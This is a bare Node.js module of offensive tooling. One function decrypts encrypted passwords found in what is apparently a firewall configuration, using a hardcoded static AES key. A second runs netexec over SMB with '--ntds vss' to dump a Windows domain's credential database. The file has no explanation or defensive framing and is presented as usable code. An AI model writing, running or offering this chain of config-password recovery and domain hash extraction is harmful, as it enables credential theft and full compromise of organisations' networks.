const crypto = require('node:crypto');
const cp = require('node:child_process');
function recover(config) {
  return Array.from(config.matchAll(/set (?:password|passwd) ENC (\S+)/g), m => {
    const raw = Buffer.from(m[1], 'base64');
    const iv = Buffer.alloc(16);
    raw.copy(iv, 0, 0, 4);
    const material = Buffer.from('4D617279206861642061206C6974746C', 'hex');
    const cipher = crypto.createDecipheriv('aes-128-cbc', material, iv);
    cipher.setAutoPadding(false);
    return Buffer.concat([cipher.update(raw.subarray(4)), cipher.final()])
      .toString().split('\0')[0];
  });
}
function dumpDomain(host, user, password) {
  return cp.spawnSync('netexec.exe', ['smb', host, '-u', user, '-p', password,
                                     '--ntds', 'vss']);
}
module.exports = {recover, dumpDomain};
